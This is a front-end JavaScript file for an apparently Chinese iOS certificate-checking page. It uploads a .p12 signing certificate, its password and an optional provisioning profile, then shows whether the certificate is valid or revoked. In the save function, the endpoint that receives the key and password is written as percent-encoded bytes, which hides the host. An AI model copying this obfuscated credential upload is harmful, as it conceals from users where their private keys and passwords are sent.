var urlInputTips = '请输入短链接';
var checkNowBtn = '立即检测';
var recheckBtn = '继续检测其他证书';
var onlyCheckOneFileTips = '每次只能检测一个文件';
var fileTypeErrorTips = '文件格式不正确，仅支持 p12 格式文件';
var provisionFileTypeErrorTips = '文件格式不正确';
var checkingTips = '检测中...';
var uploadFileTips = '请先上传证书文件';
var uploadMPFileTips = '请先上传mobileprovision文件';
var certFilter = ['p12'];
var provisionFilter = ['mobileprovision'];
var currentType = 'file';
var fd;
var fileCounter;
$(function() {
  $('#submitButton').on('click', function() {
    save();
  });

  $('[data-toggle="popover"]').popover();
  $(document).on('dragenter, dragover, drop', function(e) {
    e.stopPropagation();
    e.preventDefault();
  });

  var obj = $('#uploadCert, #uploadProvision');
  obj.off('click.uploadFile').on('click.uploadFile', function() {
    $('#uploadfile').click();
    $('#uploadfile').data('source', $(this).attr('id'));
  });
  obj.on('dragenter, dragover', function(e) {
    e.stopPropagation();
    e.preventDefault();
  });

  obj.on('dragleave', function(e) {
    $(this).removeClass('drag');
  });

  obj.on('dragover', function(e) {
    $(this).addClass('drag');
  });

  obj.on('drop', function(e) {
    $(this).removeClass('drag');
    e.preventDefault();
    var files = e.originalEvent.dataTransfer.files;

    $('#uploadfile').data('source', $(this).attr('id'));
    //We need to send dropped files to Server
    handleFileUpload(files, $('#uploadfile'));
  });
});

function resetParams() {
  fileCounter = { provisionCounter: 0, certCounter: 0 };
  fd = new FormData();
}
resetParams();

function handleFileUpload(files, obj) {
  if (files.length > 1) {
    alert(onlyCheckOneFileTips);
    return false;
  }

  var source = obj.data().source;
  var uploadDom = $('#' + source);
  for (var i = 0; i < files.length; i++) {
    var file = files[i];
    var ext = file.name.split('.').pop();
    var isCert = false;
    var isProvision = false;
    if ($.inArray(ext, certFilter) != -1) {
      isCert = true;
    } else if ($.inArray(ext, provisionFilter) != -1) {
      isProvision = true;
    } else {
      alert(fileTypeErrorTips);
      return false;
    }

    if (source == 'uploadCert' && !isCert) {
      alert(fileTypeErrorTips);
      return false;
    } else if (source == 'uploadProvision' && !isProvision) {
      alert(provisionFileTypeErrorTips);
      return false;
    }

    if ((fileCounter.provisionCounter >= 1 && isProvision) || (fileCounter.certCounter >= 1 && isCert)) {
      alert(onlyCheckOneFileTips);
      return false;
    }

    if (isCert) {
      fileCounter.certCounter++;
      fd.append('file[cert]', files[i]);
    } else if (isProvision) {
      fileCounter.provisionCounter++;
      fd.append('file[provision]', files[i]);
    } else {
      alert(fileTypeErrorTips);
      return false;
    }

    var deleteEle = $('<i class="fa fa-times-circle delete-file"></i>').data('source', source);
    var fileIcon = $('<i class="fa fa-file-text-o pull-left" aria-hidden="true"></i>');
    var fileName = $('<p>')
      .addClass('file-name')
      .text(files[i].name)
      .append(deleteEle)
      .append(fileIcon);
    uploadDom.append(fileName);
    deleteFile();
  }
  uploadDom.find('.upload-tips, .file-icon').addClass('hide');
  obj.val('');
}

function deleteFile() {
  $('.upload-img-init .file-name > .delete-file')
    .off('click.deleteFile')
    .on('click.deleteFile', function(e) {
      e.stopPropagation();
      e.preventDefault();
      var source = $(this).data('source');
      $('#' + source)
        .find('.upload-tips, .file-icon')
        .removeClass('hide');
      resetCounter(source);
      $(this)
        .parent()
        .remove();
    });
}

function resetCounter(source) {
  if (source == 'uploadProvision') {
    fileCounter.provisionCounter = 0;
  } else {
    fileCounter.certCounter = 0;
  }
}

function save() {
  var formdata = fd;
  let url = 'https://%63%65%72%2e%62%73%73%6a%69%2e%63%6f%6d/%43%68%65%63%6b%43%65%72%74';

  if (!fileCounter.certCounter) {
    alert(uploadFileTips);
    return false;
  }

  var newData = new FormData();
  newData.append('p12', formdata.get('file[cert]'));
  newData.append('password', $('#password').val());

  if (fileCounter.provisionCounter) {
    newData.append('mp', formdata.get('file[provision]'));
    url = 'https://%63%65%72%2e%62%73%73%6a%69%2e%63%6f%6d/%55%70%6c%6f%61%64%46%69%6c%65';
  }

  $.ajax({
    type: 'POST',
    data: newData,
    url: url,
    dataType: 'json',
    cache: false,
    processData: false,
    contentType: false,
    beforeSend: function(xhr) {
      toggleSearch();
      $('#submitButton')
        .text(checkingTips)
        .addClass('btn-u-default hide')
        .attr('disabled', 'disabled');
      $('#certCheckTab > li').css('pointer-events', 'none');
    },
    success: function(result, textStatus, jqXHR) {
      code = result.code;
      displayRes(result);
      displayReCheckBtn();
      $('#submitButton')
        .text(checkNowBtn)
        .removeClass('btn-u-default')
        .removeAttr('disabled');
      $('#certCheckTab > li').css('pointer-events', 'auto');
    },
    error: function(jqXHR, textStatus, errorThrown) {
      $('#submitButton')
        .text(checkNowBtn)
        .removeClass('btn-u-default')
        .removeAttr('disabled');
      toggleSearch();
      $('#certCheckTab > li').css('pointer-events', 'auto');
    }
  });
  resetParams();
}

function displayRes(res) {
    $('#password').val('')
  $('#search').toggleClass('hide');
  $('#certResult').toggleClass('hide');

  var code = res.code;
  var msg = res.msg;
  var extra = res.data || {};
  var name = extra.name;
  var expired = extra.validEnd;
  var status = extra.status;
  var explain = '';
  var expiredSpan = extra.expiredSpan;
  var provisionExpiredSpan = extra.provisionExpiredSpan;
  var provisionExpireDate = extra.expirationDate;
  var provisionSignType = ''; //extra.signType;
  var matchSpan = '<span class="text-success">与证书匹配</span>';

  expired += expiredSpan;
  provisionExpireDate += provisionExpiredSpan;

  if (status === 'revoked') {
    status = '<span class="text-danger">掉签</span>';
    explain = '证书已被您自己或苹果官方撤销 (revoke) ';
  } else if (status === 'good') {
    status = '<span class="text-success">正常</span>';
    explain = null;
  } else {
    status = '<span class="text-danger">未知</span>';
    explain = null;
  }

  $('#fileCertResult').removeClass('hide');
  $('#urlCertResult').addClass('hide');

  if (code !== 0) {
    $('#certDetail')
      .removeClass('hide')
      .addClass('hide');
    $('#errorMsg')
      .removeClass('hide')
      .find('span')
      .html(msg)
      .find('span')
      .css('color', '#FD5A5A');
  } else {
    $('#errorMsg').addClass('hide');
    $('#certDetail').removeClass('hide');
    $('.certNameSpan')
      .text('')
      .text(name);
    $('.certExpireDateSpan').html(expired);
    $('.certStatusSpan').html(status);
    if (provisionExpireDate) {
      $('#provisionExpireDate').html(provisionExpireDate);
    }

    if (provisionSignType) {
      $('.provisionSignType').removeClass('hide');
      $('#provisionSignType').html(provisionSignType);
    }

    if (matchSpan) {
      $('#provisionStatus').html(matchSpan);
    }

    if (provisionExpiredSpan && matchSpan) {
      $('.provision-detail').removeClass('hide');
    } else {
      $('.provision-detail').addClass('hide');
    }

    if (explain) {
      $('.certStatusExplain')
        .removeClass('hide')
        .attr('data-content', explain);
    } else {
      $('.certStatusExplain')
        .addClass('hide')
        .attr('data-content', '');
    }
  }
}

function toggleRes() {
  $('#certResult').toggleClass('hide');
  $('.tab-pane').toggleClass('hide');
  $('submitButton').toggleClass('hide');
  displayCheckBtn();
}

function toggleSearch() {
  $('.tab-pane').toggleClass('hide');
  $('#search').toggleClass('hide');
  $('.file-name').remove();
  $('.upload-img-init .upload-tips, .upload-img-init .file-icon').removeClass('hide');
}

function displayCheckBtn() {
  $('#submitButton').removeClass('hide');
  $('#recheckBtn').addClass('hide');
}

function displayReCheckBtn() {
  $('#submitButton').addClass('hide');
  $('#recheckBtn').removeClass('hide');
}

function removeAppInfo() {
  $('.appName').addClass('hide');
  $('#certFlag').removeClass('hide');
}

$('a[data-toggle="tab"]').on('show.bs.tab', function(e) {
  $('.upload-img-init .upload-tips, .upload-img-init .file-icon').removeClass('hide');
  currentType = $(e.currentTarget).data('id');
  $('.tab-pane').removeClass('hide');
  $('#certResult').addClass('hide');
  displayCheckBtn();
  removeAppInfo();
  if (currentType == 'file') {
    $('#fileCheckAlert').removeClass('hide');
  } else {
    $('#fileCheckAlert').addClass('hide');
  }
});